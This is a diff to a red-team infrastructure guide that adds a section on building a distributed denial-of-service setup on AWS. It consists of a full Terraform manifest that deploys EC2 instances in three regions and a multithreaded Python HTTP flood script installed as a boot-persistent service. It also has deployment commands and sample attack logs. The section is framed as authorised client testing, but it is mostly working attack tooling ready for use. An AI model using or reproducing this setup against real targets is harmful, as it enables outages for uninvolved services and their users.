@@ -8,6 +8,7 @@ This document contains guidelines on deploying infrastructure that can be useful
 - [Deploy a static website via GitHub Pages](#deploy-a-static-website-via-github-pages)
 - [Maintain persistent access with Tailscale](#maintain-persistent-access-with-tailscale)  
 - [Deploy a Lambda function for data exfiltration](#deploy-a-lambda-function-for-data-exfiltration)  
+- [Deploy AWS Infrastructure for DDoS Engagements](#deploy-aws-infrastructure-for-ddos-engagements)
 
 
 ## Deploy a static website via AWS S3 and CloudFront  
@@ -594,6 +595,463 @@ zip -r test_folder.zip test_folder \
 
 You can later retrieve all the exfiltrated files from the S3 bucket:  
 ![data](./images/s3-data-exfiltration.png)  
+
+
+
+## Deploy AWS Infrastructure for DDoS Engagements
+
+
+Although quite rare, clients occasionally request distributed denial-of-service (DDoS) testing activities.  
+Today, with the hardware resources and bandwidth available to most services, it's not easy to inflict damage through a DDoS attack, so a substantial level of firepower is essential.   
+
+Below, a proof of concept using a Terraform manifest to provision a geographically distributed fleet of servers on AWS, specifically designed for launching DDoS campaigns.  
+
+> [!CAUTION]  
+> First, ensure the provider's current policies permit such activities, and monitor any potential costs closely.  
+
+here is the `main.tf` manifest:  
+```hcl
+terraform {
+  required_version = "= 1.9.8"
+
+  # Infra state bucket (created manually on AWS)
+  backend "s3" {} # specify the backend bucket
+
+  required_providers {
+    aws = {
+      source  = "hashicorp/aws"
+      version = "= 5.68.0"
+    }
+  }
+}
+
+
+# AWS provider for the default region (eu-north-1)
+provider "aws" {
+  alias  = "eu-north-1"
+  region = "eu-north-1"
+}
+
+# AWS provider for another region (eu-west-1)
+provider "aws" {
+  alias  = "eu-west-1"
+  region = "eu-west-1"
+}
+
+# AWS provider for another region (ap-south-1)
+provider "aws" {
+  alias  = "ap-south-1"
+  region = "ap-south-1"
+}
+
+# Create the key pair from the public key
+resource "aws_key_pair" "redteam_key" {
+  key_name   = "aws-ddos-redteam-infra"
+  public_key = file("~/.ssh/aws-ddos-redteam-infra.pub")
+}
+
+# Security group for eu-north-1
+resource "aws_security_group" "mhddos_sg_eu_north" {
+  provider    = aws.eu-north-1
+  name        = "mhddos_sg_eu_north"
+  description = "Security group for MHDDoS instances in eu-north-1"
+
+  ingress {
+    from_port   = 22
+    to_port     = 22
+    protocol    = "tcp"
+    cidr_blocks = ["0.0.0.0/0"]
+  }
+
+  egress {
+    from_port   = 0
+    to_port     = 0
+    protocol    = "-1"
+    cidr_blocks = ["0.0.0.0/0"]
+  }
+}
+
+# Security group for eu-west-1
+resource "aws_security_group" "mhddos_sg_eu_west" {
+  provider    = aws.eu-west-1
+  name        = "mhddos_sg_eu_west"
+  description = "Security group for MHDDoS instances in eu-west-1"
+
+  ingress {
+    from_port   = 22
+    to_port     = 22
+    protocol    = "tcp"
+    cidr_blocks = ["0.0.0.0/0"]
+  }
+
+  egress {
+    from_port   = 0
+    to_port     = 0
+    protocol    = "-1"
+    cidr_blocks = ["0.0.0.0/0"]
+  }
+}
+
+# Security group for ap-south-1
+resource "aws_security_group" "mhddos_sg_ap_south" {
+  provider    = aws.ap-south-1
+  name        = "mhddos_sg_ap_south"
+  description = "Security group for MHDDoS instances in ap-south-1"
+
+  ingress {
+    from_port   = 22
+    to_port     = 22
+    protocol    = "tcp"
+    cidr_blocks = ["0.0.0.0/0"]
+  }
+
+  egress {
+    from_port   = 0
+    to_port     = 0
+    protocol    = "-1"
+    cidr_blocks = ["0.0.0.0/0"]
+  }
+}
+
+
+# Deploy EC2 instance in eu-north-1
+resource "aws_instance" "mhddos_eu_north" {
+  count         = 1
+  provider      = aws.eu-north-1
+  ami           = "ami-08eb150f611ca277f"  # Ubuntu 22.04 LTS AMI
+  instance_type = "t3.micro"
+  key_name      = aws_key_pair.redteam_key.key_name
+  vpc_security_group_ids = [aws_security_group.mhddos_sg_eu_north.id]
+
+  # Copy the Python script
+  provisioner "file" {
+    source      = "./ddos_script.py"
+    destination = "/home/ubuntu/ddos_script.py"
+
+    connection {
+      type        = "ssh"
+      user        = "ubuntu"
+      private_key = file("~/.ssh/aws-ddos-redteam-infra")
+      host        = self.public_ip
+    }
+  }
+
+  # Copy the service file to a temporary location
+  provisioner "file" {
+    source      = "./ddos_script.service"  # Local service file
+    destination = "/home/ubuntu/ddos_script.service"  # Temporary location in the home directory
+
+    connection {
+      type        = "ssh"
+      user        = "ubuntu"
+      private_key = file("~/.ssh/aws-ddos-redteam-infra")
+      host        = self.public_ip
+    }
+  }
+
+  # Move the service file to /etc/systemd/system/ and start the service
+  provisioner "remote-exec" {
+    inline = [
+      # Move the service file to the correct location with sudo
+      "sudo mv /home/ubuntu/ddos_script.service /etc/systemd/system/ddos_script.service",
+
+      # Reload systemd to recognize the new service
+      "sudo systemctl daemon-reload",
+
+      # Start the service (this will run the script in the background)
+      "sudo systemctl start ddos_script.service",
+
+      # Enable the service to start on boot
+      "sudo systemctl enable ddos_script.service"
+    ]
+
+    connection {
+      type        = "ssh"
+      user        = "ubuntu"
+      private_key = file("~/.ssh/aws-ddos-redteam-infra")
+      host        = self.public_ip
+    }
+  }
+
+  tags = {
+    Name = "MHDDoS-EU-North"
+  }
+}
+
+# Repeat for eu-west-1 and ap-south-1
+
+resource "aws_instance" "mhddos_eu_west" {
+  count         = 1
+  provider      = aws.eu-west-1
+  ami           = "ami-0d64bb532e0502c46"
+  instance_type = "t2.micro"
+  key_name      = aws_key_pair.redteam_key.key_name
+  vpc_security_group_ids = [aws_security_group.mhddos_sg_eu_west.id]
+
+  provisioner "file" {
+    source      = "./ddos_script.py"
+    destination = "/home/ubuntu/ddos_script.py"
+
+    connection {
+      type        = "ssh"
+      user        = "ubuntu"
+      private_key = file("~/.ssh/aws-ddos-redteam-infra")
+      host        = self.public_ip
+    }
+  }
+
+  provisioner "file" {
+    source      = "./ddos_script.service"
+    destination = "/home/ubuntu/ddos_script.service"
+
+    connection {
+      type        = "ssh"
+      user        = "ubuntu"
+      private_key = file("~/.ssh/aws-ddos-redteam-infra")
+      host        = self.public_ip
+    }
+  }
+
+  provisioner "remote-exec" {
+    inline = [
+      "sudo mv /home/ubuntu/ddos_script.service /etc/systemd/system/ddos_script.service",
+      "sudo systemctl daemon-reload",
+      "sudo systemctl start ddos_script.service",
+      "sudo systemctl enable ddos_script.service"
+    ]
+
+    connection {
+      type        = "ssh"
+      user        = "ubuntu"
+      private_key = file("~/.ssh/aws-ddos-redteam-infra")
+      host        = self.public_ip
+    }
+  }
+
+  tags = {
+    Name = "MHDDoS-EU-West"
+  }
+}
+
+resource "aws_instance" "mhddos_ap_south" {
+  count         = 1
+  provider      = aws.ap-south-1
+  ami           = "ami-0dee22c13ea7a9a67"
+  instance_type = "t2.micro"
+  key_name      = aws_key_pair.redteam_key.key_name
+  vpc_security_group_ids = [aws_security_group.mhddos_sg_ap_south.id]
+
+  provisioner "file" {
+    source      = "./ddos_script.py"
+    destination = "/home/ubuntu/ddos_script.py"
+
+    connection {
+      type        = "ssh"
+      user        = "ubuntu"
+      private_key = file("~/.ssh/aws-ddos-redteam-infra")
+      host        = self.public_ip
+    }
+  }
+
+  provisioner "file" {
+    source      = "./ddos_script.service"
+    destination = "/home/ubuntu/ddos_script.service"
+
+    connection {
+      type        = "ssh"
+      user        = "ubuntu"
+      private_key = file("~/.ssh/aws-ddos-redteam-infra")
+      host        = self.public_ip
+    }
+  }
+
+  provisioner "remote-exec" {
+    inline = [
+      "sudo mv /home/ubuntu/ddos_script.service /etc/systemd/system/ddos_script.service",
+      "sudo systemctl daemon-reload",
+      "sudo systemctl start ddos_script.service",
+      "sudo systemctl enable ddos_script.service"
+    ]
+
+    connection {
+      type        = "ssh"
+      user        = "ubuntu"
+      private_key = file("~/.ssh/aws-ddos-redteam-infra")
+      host        = self.public_ip
+    }
+  }
+
+  tags = {
+    Name = "MHDDoS-AP-South"
+  }
+}
+
+
+# Output public IPs of each region
+output "eu_north_instance_ips" {
+  description = "The public IPs of the EU-North attacker instances"
+  value       = aws_instance.mhddos_eu_north[*].public_ip
+}
+
+output "eu_west_instance_ips" {
+  description = "The public IPs of the EU-West attacker instances"
+  value       = aws_instance.mhddos_eu_west[*].public_ip
+}
+
+output "ap_south_instance_ips" {
+  description = "The public IPs of the AP-South attacker instances"
+  value       = aws_instance.mhddos_ap_south[*].public_ip
+}
+
+```  
+
+Here is the `ddos_script.py` a "vanilla" python script to do volumetric Layer 7 (http) DoS against a specified target url (you can modify this script to use less intensive techniques like [*slow loris*](https://en.wikipedia.org/wiki/Slowloris_(cyber_attack)):  
+
+```python
+import threading
+import requests
+import time
+from datetime import datetime
+
+# Number of threads
+THREADS = 150
+
+# Target URL
+TARGET_URL = "https://example.com"
+
+# Duration of the attack in seconds
+DURATION = 10
+
+# Counter for successful requests
+request_count = 0
+
+# Lock to safely update the counter across threads
+lock = threading.Lock()
+
+# Function to send HTTP GET requests
+def send_requests():
+    global request_count
+    while time.time() < end_time:
+        try:
+            response = requests.get(TARGET_URL)
+            with lock:
+                request_count += 1  # Safely increment the count
+        except requests.exceptions.RequestException as e:
+            print(f"Error: {e}")
+
+# Print the start time
+print(f"Attack against target {TARGET_URL} started at: {datetime.now()}")
+
+# Start time of the attack
+start_time = time.time()
+
+# End time of the attack
+end_time = start_time + DURATION
+
+# Create and start threads
+threads = []
+for i in range(THREADS):
+    t = threading.Thread(target=send_requests)
+    t.start()
+    threads.append(t)
+
+# Wait for all threads to complete
+for t in threads:
+    t.join()
+
+# Print the end time and total number of requests sent
+print(f"Attack ended at: {datetime.now()}")
+print(f"Total number of requests sent: {request_count}")
+```   
+
+### Instructions  
+
+Generate the required ssh keys (both public and private) for connecting to the cloud VMs and put them in `~/.ssh/`:  
+
+```console
+ssh-keygen -t rsa -b 4096 -C "aws-ddos-redteam-infra" -f ~/.ssh/aws-ddos-redteam-infra
+```  
+
+
+Ensure the correct permissions are set for the keys:  
+```sh
+chmod 600 ~/.ssh/aws-ddos-redteam-infra
+chmod 644 ~/.ssh/aws-ddos-redteam-infra.pub
+```  
+
+
+Now modify the parameters in `ddos_script.py` and also the number and types of EC2 instances to create in `main.tf`.   
+
+
+Now procede to initialize terraform, produce the provisioning plan and launch the deployment:  
+```sh
+terraform init && terraform plan && terraform apply
+```  
+
+
+> NOTE  
+> If you get keys not present error during the provisioning, it is possible that you might have to upload the keys to different regions manually:   
+> `aws ec2 import-key-pair --region <region-here> --key-name aws-ddos-redteam-infra --public-key-material file://~/.ssh/aws-ddos-redteam-infra.pub`    
+
+
+Once the provisioning is completed, terraform will output something similar to the following:  
+```console
+Apply complete! Resources: 10 added, 0 changed, 0 destroyed.
+
+Outputs:
+
+ap_south_instance_ips = [
+  "65.0.6.216",
+  "13.233.22.168",
+]
+eu_north_instance_ips = [
+  "51.21.150.77",
+  "13.49.72.11",
+]
+eu_west_instance_ips = [
+  "3.254.115.92",
+  "34.244.127.104",
+]
+```  
+
+At this point you can connect to the machines with the following command:  
+```sh
+ssh -i ~/.ssh/aws-ddos-redteam-infra ubuntu@<instance-public-ip>
+```  
+
+Once on the machine, verify the status of the DDoS service with the following command:  
+```sh
+sudo systemctl status ddos_script.service
+```  
+
+In the output of the previous command, you will also find the ddos service logs, for example:  
+```console
+ddos_script.service - DDoS attack script
+     Loaded: loaded (/etc/systemd/system/ddos_script.service; enabled; preset: enabled)
+     Active: inactive (dead) since Wed 2024-10-23 15:55:21 UTC; 53s ago
+   Duration: 13.252s
+    Process: 1333 ExecStart=/usr/bin/python3 /home/ubuntu/ddos_script.py (code=exited, status=0/SUCCESS)
+   Main PID: 1333 (code=exited, status=0/SUCCESS)
+        CPU: 22.860s
+
+Oct 23 15:55:08 ip-172-31-18-78 systemd[1]: Started ddos_script.service - DDoS attack script.
+Oct 23 15:55:21 ip-172-31-18-78 python3[1333]: Attack against target https://example.com started at: 2024-10-23 15:55:09.649547
+Oct 23 15:55:21 ip-172-31-18-78 python3[1333]: Attack ended at: 2024-10-23 15:55:21.395468
+Oct 23 15:55:21 ip-172-31-18-78 python3[1333]: Total number of requests sent: 278
+Oct 23 15:55:21 ip-172-31-18-78 systemd[1]: ddos_script.service: Deactivated successfully.
+```  
+
+If you want to destroy the infrastructure run:  
+```sh
+terraform destroy
+```  
+
+
+
+
+
+
+
 
 
 
